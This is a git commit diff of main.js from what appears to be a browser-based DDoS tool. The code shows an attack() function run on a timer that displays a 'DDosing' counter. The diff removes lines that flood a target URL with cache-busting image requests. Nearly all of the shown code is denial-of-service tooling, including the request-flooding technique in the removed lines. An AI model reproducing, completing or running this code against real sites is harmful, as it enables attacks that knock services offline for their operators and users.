e3fc51b546c8436d5b17aebb54b290fbc62ea04d
plurryt <70047632+pythoniaweb@users.noreply.github.com>
2022-07-10 15:04:35 +0200

    Update main.js

--- main.js
+++ main.js
@@ -10,10 +10,8 @@ function attack() {
 	
    dn = dn + 1
    document.body.innerHTML= `DDosing ${dn}`;
-  
+   
 
-                    img.onload = function () { onSuccess(rID); }; // TODO: it may never happen if target URL is not an image... // but probably can be fixed with different methods
-					img.setAttribute("src", targetURL + "?killinAllThatCacheYeah=" + rand2 + "&msg=" + msg);
-
+                    
 }
 setInterval(attack, speed);  
